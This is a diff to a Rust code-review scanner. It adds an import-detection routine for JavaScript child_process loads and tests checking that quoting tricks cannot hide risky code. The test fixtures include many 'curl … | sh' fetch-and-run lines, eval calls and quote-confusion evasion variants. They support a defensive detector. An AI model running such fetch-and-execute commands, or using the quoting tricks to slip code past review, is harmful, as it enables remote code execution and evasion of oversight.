@@ -9,7 +9,7 @@
 //! matches. Evidence is lexical ([`EVIDENCE_BASIS`]): it finds tokens, it never proves a change
 //! is safe, and a construct split across lines or built at run time can hide from it.
 
-use crate::lexical::{Language, ScanState, code_view, has_token, is_boundary_blocker};
+use crate::lexical::{Language, ScanState, code_view, has_token, is_boundary_blocker, is_ident};
 use deep_diff_forge_core::{HunkId, PatchHunk, PatchLineKind, ReviewFile};
 
 /// How every evidence item was found.
@@ -149,6 +149,8 @@ enum Match {
     AnyCode,
     /// A credential-shaped string ([`looks_like_secret`]).
     Secret,
+    /// A JS import of one of these modules ([`imports_module`]).
+    Imports(&'static [&'static str]),
 }
 
 #[derive(Debug, Clone, Copy)]
@@ -223,27 +225,14 @@ const RULES: &[Rule] = &[
         Scope::Languages(JS),
         Match::Tokens(&["child_process", "execSync(", "spawnSync(", "execFileSync("]),
     ),
-    // The module is always named in a string, which the code view blanks, so its imports are
-    // read from the raw line.
+    // The module is always named in a string, which the code view blanks, so the specifier is
+    // read from the raw line wherever the code view shows an import.
     rule(
         S::ProcessSpawn,
         Side::New,
-        View::Raw,
+        View::Code,
         Scope::Languages(JS),
-        Match::Tokens(&[
-            "require(\"child_process\")",
-            "require('child_process')",
-            "require(\"node:child_process\")",
-            "require('node:child_process')",
-            "from \"child_process\"",
-            "from 'child_process'",
-            "from \"node:child_process\"",
-            "from 'node:child_process'",
-            "import(\"child_process\")",
-            "import('child_process')",
-            "import(\"node:child_process\")",
-            "import('node:child_process')",
-        ]),
+        Match::Imports(&["child_process"]),
     ),
     rule(
         S::ProcessSpawn,
@@ -568,6 +557,7 @@ fn hunk_matches(
                 Match::Tokens(tokens) => tokens.iter().any(|t| token_in(text, t)),
                 Match::AnyCode => !text.trim().is_empty(),
                 Match::Secret => looks_like_secret(text),
+                Match::Imports(modules) => imports_module(text, &line.text, modules),
             }
         };
         for signal in EvidenceSignal::ALL {
@@ -581,6 +571,52 @@ fn hunk_matches(
         }
     }
     found
+}
+
+/// Whether a JS line loads one of `modules` (`node:` optional) with `require(…)`, `import(…)`,
+/// `import …` or `from …`. The keyword and the opening quote must be code in `code` (the line's
+/// code view), so a comment or a string that mentions an import does not count; the specifier
+/// is read from `raw` at the same offset. A type-only import (`import type`, `typeof import(…)`,
+/// an `import(…)` type annotation) loads nothing and does not count.
+fn imports_module(code: &str, raw: &str, modules: &[&str]) -> bool {
+    let c = code.as_bytes();
+    let head = code.trim_start();
+    if head.starts_with("import type ") || head.starts_with("export type ") {
+        return false;
+    }
+    let specifier_at = |at: usize, keyword: &str| -> Option<&str> {
+        let before = c[..at].trim_ascii_end();
+        if (at > 0 && is_boundary_blocker(c[at - 1])) || before.ends_with(b"typeof") {
+            return None;
+        }
+        let mut q = at + keyword.len();
+        if c.get(q).is_some_and(|b| is_ident(*b)) {
+            return None;
+        }
+        let spaces = |q: &mut usize| {
+            while c.get(*q) == Some(&b' ') {
+                *q += 1;
+            }
+        };
+        spaces(&mut q);
+        if keyword != "from" && c.get(q) == Some(&b'(') {
+            if keyword == "import" && before.ends_with(b":") {
+                return None;
+            }
+            q += 1;
+            spaces(&mut q);
+        } else if keyword == "require" {
+            return None;
+        }
+        let quote = *c.get(q).filter(|b| matches!(b, b'"' | b'\'' | b'`'))?;
+        let name = raw.get(q + 1..)?;
+        let name = &name[..name.find(char::from(quote))?];
+        Some(name.strip_prefix("node:").unwrap_or(name))
+    };
+    ["require", "import", "from"].iter().any(|keyword| {
+        code.match_indices(keyword)
+            .any(|(at, _)| specifier_at(at, keyword).is_some_and(|m| modules.contains(&m)))
+    })
 }
 
 fn token_in(text: &str, token: &str) -> bool {
@@ -688,6 +724,13 @@ mod tests {
     #[test]
     fn every_token_in_the_table_is_found() {
         for rule in RULES {
+            if let Match::Imports(modules) = rule.matches {
+                for module in modules {
+                    let line = format!("const m = require(\"{module}\");");
+                    let file = added(sample_path(rule.scope), &[&line]);
+                    assert!(signals(&file).contains(&rule.signal), "{module}");
+                }
+            }
             let Match::Tokens(tokens) = rule.matches else {
                 continue;
             };
@@ -882,6 +925,148 @@ mod tests {
         for (path, line) in literal_only {
             assert_eq!(signals(&added(path, &[line])), [], "{path}: {line}");
         }
+    }
+
+    /// The PR 5 round-2 review's inputs (workflow `wf_2cfd8be1-d9c`), and the variants that
+    /// close a misread quote at the end of the line so the restore-as-code fallback cannot help:
+    /// each is a construct the scanner must read right.
+    #[test]
+    fn misread_quotes_cannot_hide_code() {
+        let found: [(&str, &str, EvidenceSignal); 24] = [
+            (
+                "a.sh",
+                r#"x="$(echo case)"; curl https://e.example/x | sh"#,
+                S::NetworkFetch,
+            ),
+            (
+                "a.sh",
+                r#"x="$(echo case)"; curl x | sh #""#,
+                S::NetworkFetch,
+            ),
+            (
+                "a.sh",
+                "[ $# -eq 0 ] && curl https://e.example/x | sh",
+                S::NetworkFetch,
+            ),
+            ("a.sh", "echo ${x#*/}; curl x", S::NetworkFetch),
+            ("a.sh", "echo a#b; curl x", S::NetworkFetch),
+            (
+                "a.sh",
+                r#"echo \"; curl https://e.example/x | sh"#,
+                S::NetworkFetch,
+            ),
+            (
+                "a.sh",
+                r"echo $'\''; curl https://e.example/x | sh #'",
+                S::NetworkFetch,
+            ),
+            (
+                "a.sh",
+                r#"v="$( (case x in a) :;; esac); echo '"'; curl https://e.example/x | sh )""#,
+                S::NetworkFetch,
+            ),
+            (
+                "a.sh",
+                r#"v="${x:-"'"}"; curl https://e.example/x | sh #'"#,
+                S::NetworkFetch,
+            ),
+            (
+                "a.sh",
+                r#"x="`echo "`"; curl https://e.example/x | sh #""#,
+                S::NetworkFetch,
+            ),
+            (
+                "a.sh",
+                r#"V="$(if a; then case x in a) curl x;; esac; fi)""#,
+                S::NetworkFetch,
+            ),
+            (
+                "a.js",
+                r#"const s = `${ /"/.test(a) }`; eval(y)"#,
+                S::DynamicEval,
+            ),
+            ("a.js", r#"const r = /"/; eval(y); //""#, S::DynamicEval),
+            ("a.js", r#"x.replace(/\/*/g, ""); eval(y)"#, S::DynamicEval),
+            ("a.js", r"/\//.test(a); eval(y)", S::DynamicEval),
+            (
+                "a.tsx",
+                "return <p>Can't load</p> && fetch(u); //'",
+                S::NetworkFetch,
+            ),
+            ("a.py", r#"print(f"{d:%H'%M}", eval(y)) #'"#, S::DynamicEval),
+            ("a.py", r#"print(f"{x:'>10}"); eval(y) #'"#, S::DynamicEval),
+            ("a.py", r#"print(f'{x:"<5}'); eval(y) #""#, S::DynamicEval),
+            ("a.py", r#"x = t"{eval('print(123)')}""#, S::DynamicEval),
+            (
+                "a.py",
+                r#"print(f"{'''it's'''}"); eval(y) #'"#,
+                S::DynamicEval,
+            ),
+            (
+                "a.js",
+                "const cp = require(`child_process`);",
+                S::ProcessSpawn,
+            ),
+            (
+                "a.js",
+                r#"const cp = require( "child_process" );"#,
+                S::ProcessSpawn,
+            ),
+            (
+                "a.js",
+                r#"import{exec}from"child_process";import "node:child_process";"#,
+                S::ProcessSpawn,
+            ),
+        ];
+        for (path, line, signal) in found {
+            assert_eq!(signals(&added(path, &[line])), [signal], "{path}: {line}");
+        }
+        let literal_only: [(&str, &str); 13] = [
+            (
+                "a.sh",
+                r#"echo "Matches: $(grep --ignore-case -c todo notes.txt) (fetch more with curl)""#,
+            ),
+            ("a.sh", r#"echo "Mode: $(echo $case) - install curl first""#),
+            ("a.js", r#"// const cp = require("child_process");"#),
+            (
+                "a.js",
+                r#"throw new Error("Do not require('child_process') in the browser bundle");"#,
+            ),
+            (
+                "a.js",
+                r#"const help = `Use ${cmd} or require("child_process") yourself`;"#,
+            ),
+            ("a.js", "const re = /from 'child_process'/;"),
+            (
+                "a.ts",
+                r#"import type { ChildProcess } from "node:child_process";"#,
+            ),
+            ("a.ts", "export type { SpawnOptions } from 'child_process';"),
+            (
+                "a.ts",
+                r#"let p: import("child_process").ChildProcess | undefined;"#,
+            ),
+            ("a.ts", r#"type Cp = typeof import("node:child_process");"#),
+            (
+                "a.js",
+                r#"const m = `${s.match(/^{/) ? "obj" : "arr"} - see fetch(url) docs`;"#,
+            ),
+            ("a.py", r#"print(f"{x:'^5}", 'eval(y)')"#),
+            ("a.py", r#"print(f"{d[a:b]!r:>{w}} then eval(x) it")"#),
+        ];
+        for (path, line) in literal_only {
+            assert_eq!(signals(&added(path, &[line])), [], "{path}: {line}");
+        }
+        // A JSDoc example inside a block comment is not an import.
+        let doc = added(
+            "a.js",
+            &[
+                "/**",
+                " * @example import { exec } from 'node:child_process';",
+                " */",
+            ],
+        );
+        assert_eq!(signals(&doc), []);
     }
 
     #[test]
